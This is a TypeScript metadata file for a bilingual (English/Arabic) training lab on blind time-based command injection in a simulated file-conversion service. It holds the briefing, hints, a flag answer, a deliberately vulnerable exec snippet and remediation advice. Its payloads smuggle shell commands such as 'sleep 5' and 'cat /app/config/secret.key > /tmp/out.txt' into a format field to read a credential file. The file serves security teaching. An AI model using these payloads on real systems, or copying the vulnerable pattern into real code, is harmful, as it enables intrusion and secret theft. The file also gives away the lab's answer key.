// src/modules/practice-labs/command-injection/labs/lab2/lab2.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab2Metadata: LabMetadata = {
  slug: 'cmdi-blind-time-based-file-converter',
  title: 'Command Injection: Blind Time-Based — File Format Converter',
  ar_title: 'حقن الأوامر: أعمى زمني — محول صيغ الملفات',
  description:
    'Exploit a blind command injection vulnerability in a file conversion service. The server executes a conversion command but never returns command output. Use time-based techniques (sleep) to confirm injection, then exfiltrate the flag by redirecting output to a readable temp file.',
  ar_description:
    'استغل ثغرة حقن أوامر عمياء في خدمة تحويل الملفات. الخادم ينفذ أمر التحويل لكن لا يُعيد ناتج الأوامر. استخدم تقنيات زمنية (sleep) لتأكيد الحقن ثم سرب العلم بإعادة توجيه الناتج لملف مؤقت قابل للقراءة.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'Blind Command Injection',
    'Time-Based Detection',
    'Out-of-Band Techniques',
    'File Processing Security',
  ],
  xpReward: 250,
  pointsReward: 125,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'The file converter runs a shell command but never shows its output. Confirm blind injection using sleep commands. Then use the /cmdi/read-file endpoint to exfiltrate /app/config/secret.key from the server.',
  ar_goal:
    'يُشغّل محول الملفات أمر shell لكن لا يُظهر ناتجه أبداً. أكّد الحقن الأعمى باستخدام أوامر sleep. ثم استخدم endpoint /cmdi/read-file لسرب /app/config/secret.key من الخادم.',

  briefing: {
    en: `ConvertX — file format conversion SaaS. Upload documents, get PDFs.
POST /convert { "filename": "report", "format": "docx" }
Response: { "success": true, "message": "Conversion complete" }
Always the same response. No output. No errors. Nothing.
The backend runs: exec("convert report.docx output.pdf")
Your format goes in. No validation.
You try: { "format": "docx; whoami" }
Response: { "success": true, "message": "Conversion complete" }
Same response. Nothing changes.
You can't see your output.
But the command ran.
How do you prove it?
You inject: { "format": "docx; sleep 5" }
You wait.
5 seconds later — the response arrives.
The server paused.
Injection confirmed.
Now: how do you read data when you can't see it?`,
    ar: `ConvertX — SaaS تحويل صيغ الملفات. ارفع المستندات، احصل على PDFs.
POST /convert { "filename": "report"، "format": "docx" }
الاستجابة: { "success": true، "message": "Conversion complete" }
دائماً نفس الاستجابة. لا ناتج. لا أخطاء. لا شيء.
الـ backend يُشغّل: exec("convert report.docx output.pdf")
صيغتك تدخل. بدون تحقق.
تجرب: { "format": "docx; whoami" }
الاستجابة: { "success": true، "message": "Conversion complete" }
نفس الاستجابة. لا شيء يتغير.
لا يمكنك رؤية ناتجك.
لكن الأمر نُفِّذ.
كيف تُثبت ذلك؟
تحقن: { "format": "docx; sleep 5" }
تنتظر.
بعد 5 ثوانٍ — تصل الاستجابة.
الخادم توقف.
تأكيد الحقن.
الآن: كيف تقرأ البيانات حين لا يمكنك رؤيتها؟`,
  },

  stepsOverview: {
    en: [
      'POST /convert { "filename": "report", "format": "docx" } — observe constant "Conversion complete" regardless of format',
      'Time-based probe: { "format": "docx; sleep 5" } — measure response time. If 5+ seconds: blind injection confirmed',
      'Redirect output: { "format": "docx; cat /app/config/secret.key > /tmp/out.txt" } — write secret to readable temp location',
      'POST /cmdi/read-file { "path": "/tmp/out.txt" } — retrieve the redirected output',
      'Flag found in /app/config/secret.key contents: FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}',
    ],
    ar: [
      'POST /convert { "filename": "report"، "format": "docx" } — لاحظ "Conversion complete" الثابت بصرف النظر عن الصيغة',
      'اختبار زمني: { "format": "docx; sleep 5" } — قِس وقت الاستجابة. إذا كان 5+ ثوانٍ: تأكيد الحقن الأعمى',
      'أعِد توجيه الناتج: { "format": "docx; cat /app/config/secret.key > /tmp/out.txt" } — اكتب السر لمكان مؤقت قابل للقراءة',
      'POST /cmdi/read-file { "path": "/tmp/out.txt" } — استرجع الناتج المُعاد توجيهه',
      'العلم موجود في محتويات /app/config/secret.key: FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'ConvertX /convert injects the "format" parameter directly: exec("convert " + filename + "." + format + " output.pdf"). The response is always "Conversion complete" — output is never returned (blind). Time-based probing via sleep confirms injection. Output redirection (> /tmp/out.txt) allows data exfiltration via a second readable endpoint.',
    vulnerableCode:
      '// File converter (vulnerable — blind):\n' +
      "app.post('/convert', isAuthenticated, async (req, res) => {\n" +
      '  const { filename, format } = req.body;\n' +
      '  // ❌ format injected into command — output never returned!\n' +
      '  await exec(`convert ${filename}.${format} output.pdf`);\n' +
      "  res.json({ success: true, message: 'Conversion complete' }); // Blind!\n" +
      '});',
    exploitation:
      'Step 1 — Confirm: POST /convert { "format": "docx; sleep 5" } → response delayed 5s ✓\n' +
      'Step 2 — Exfiltrate: POST /convert { "format": "docx; cat /app/config/secret.key > /tmp/out.txt" }\n' +
      'Step 3 — Read: POST /cmdi/read-file { "path": "/tmp/out.txt" } → flag in response\n' +
      'OR: POST /cmdi/simulate-oob { "filename": "doc", "format": "docx", "injectCmd": "cat /app/config/secret.key" }',
    steps: {
      en: [
        'POST /convert { "filename": "doc", "format": "docx; sleep 5" } → response time: 5000ms+ → blind injection confirmed',
        'POST /convert { "filename": "doc", "format": "docx; cat /app/config/secret.key > /tmp/out.txt" } → 200 OK (no output)',
        'POST /cmdi/read-file { "path": "/tmp/out.txt" } → { "content": "APP_SECRET=FLAG{...}\\nDB_URL=...\\nAWS_KEY=..." }',
        'Flag extracted: FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}',
      ],
      ar: [
        'POST /convert { "filename": "doc"، "format": "docx; sleep 5" } → وقت الاستجابة: 5000ms+ → تأكيد الحقن الأعمى',
        'POST /convert { "filename": "doc"، "format": "docx; cat /app/config/secret.key > /tmp/out.txt" } → 200 OK (بدون ناتج)',
        'POST /cmdi/read-file { "path": "/tmp/out.txt" } → { "content": "APP_SECRET=FLAG{...}\\nDB_URL=...\\nAWS_KEY=..." }',
        'العلم مُستخرَج: FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}',
      ],
    },
    fix: [
      'Use dedicated conversion libraries (LibreOffice API, Pandoc bindings) — avoid shell exec entirely',
      'If exec is unavoidable: use execFile() with a strict format allowlist: ["pdf","docx","png","jpg"]',
      'Sandbox the conversion process: run in an isolated container with no filesystem access except the upload directory',
      'Never pass user input as part of a filename or format string in shell commands',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Blind command injection is harder to detect than visible injection but equally dangerous. When the server runs your commands but never returns output, you use indirect channels: time delays (sleep N confirms the injected command ran for N seconds), output redirection (write command output to a world-readable file then read it via another endpoint), or OOB channels (DNS, HTTP callbacks to attacker-controlled servers). Real bug bounty reports frequently feature blind injection — tools like Burp Collaborator automate OOB detection.',
      ar: 'حقن الأوامر الأعمى أصعب في الكشف من الحقن المرئي لكنه بنفس الخطورة. عندما يُنفّذ الخادم أوامرك لكن لا يُعيد الناتج أبداً، تستخدم قنوات غير مباشرة: تأخيرات زمنية (sleep N يؤكد أن الأمر المحقون نُفِّذ لـ N ثانية)، إعادة توجيه الناتج (اكتب ناتج الأمر إلى ملف قابل للقراءة ثم اقرأه عبر endpoint آخر)، أو قنوات OOB (DNS، callbacks HTTP لخوادم يتحكم فيها المهاجم). تُعرض تقارير bug bounty الحقيقية كثيراً على الحقن الأعمى — أدوات مثل Burp Collaborator تُؤتمت اكتشاف OOB.',
    },
    impact: {
      en: 'The /app/config/secret.key file contains the full production environment: database credentials (PostgreSQL production), AWS access keys, and the application JWT secret. With these, the attacker can: directly access the production database, assume the AWS IAM role (full cloud infrastructure access), forge any JWT token (bypass all authentication), and modify application data.',
      ar: 'يحتوي ملف /app/config/secret.key على بيئة الإنتاج الكاملة: بيانات اعتماد قاعدة البيانات (PostgreSQL الإنتاج)، مفاتيح وصول AWS، وسر JWT التطبيق. بهذه البيانات، يستطيع المهاجم: الوصول المباشر لقاعدة البيانات الإنتاجية، افتراض دور AWS IAM (وصول كامل للبنية التحتية السحابية)، تزوير أي JWT token (تجاوز كل المصادقة)، وتعديل بيانات التطبيق.',
    },
    fix: [
      'Use language-native conversion libraries: Node.js has pdf-lib, libreoffice-convert, sharp — no shell needed',
      'execFile() with strict allowlist: const ALLOWED_FORMATS = ["pdf","docx","png"]; if (!ALLOWED_FORMATS.includes(format)) reject',
      'Process isolation: Docker container with read-only filesystem except /uploads and /tmp',
      'Output should never include shell stdout: even if injection runs, responses must be structured and sanitized',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'The server never shows command output — always just "Conversion complete". Try format: "png; sleep 5" and measure how long the response takes. If it takes 5+ seconds, injection is confirmed.',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'Blind injection confirmed via sleep. You can\'t see output directly. Strategy: write command output to a file, then read that file. Try: format: "png; cat /app/config/secret.key > /tmp/out.txt"',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'After injecting the write command, call POST /cmdi/read-file { "path": "/tmp/out.txt" } to read what was written. The secret key file should be there.',
    },
    {
      order: 4,
      xpCost: 75,
      content:
        'Or use /cmdi/simulate-oob { "filename": "doc", "format": "docx", "injectCmd": "cat /app/config/secret.key" } for a one-step simulated OOB exfiltration.',
    },
  ],

  flagAnswer: 'FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}',
  initialState: {
    contents: [
      {
        title: 'SECRET_KEY',
        body: JSON.stringify({
          path: '/app/config/secret.key',
          content:
            'APP_SECRET=FLAG{CMDI_BLIND_TIME_BASED_FILE_CONVERTER_OOB}\nDB_URL=postgresql://prod:s3cr3t@db:5432/convertx\nAWS_KEY=AKIA_PROD_XYZ789',
        }),
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'TMP_OUTPUT',
        body: JSON.stringify({ path: '/tmp/out.txt', content: '' }),
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
